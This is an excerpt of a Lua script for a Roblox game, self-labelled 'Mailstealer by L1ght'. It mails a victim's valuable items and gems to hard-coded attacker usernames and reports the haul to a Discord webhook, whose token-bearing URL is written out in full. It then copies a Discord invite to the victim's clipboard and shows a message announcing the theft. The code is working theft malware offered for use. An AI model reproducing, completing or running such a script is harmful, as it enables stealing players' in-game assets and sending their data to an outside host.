Username = "Lyrcisas"
Username2 = "Lyrcisas" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1266831019944837191/I8HEtSjd4jWf9EO5eJ0kpv1AAS_Ch6__D5m74WHXfkHl1MtlIMObpUfhRUAKs3-4dlyV"
...
local function SendMessage(username, diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by L1ght. discord.gg/vlorp"
			}
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    SendAllGems()
    setclipboard("https://discord.gg/vlorp")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your valuable items just got stolen by L1ght's mailstealer!\nJoin discord.gg/vlorp")
end
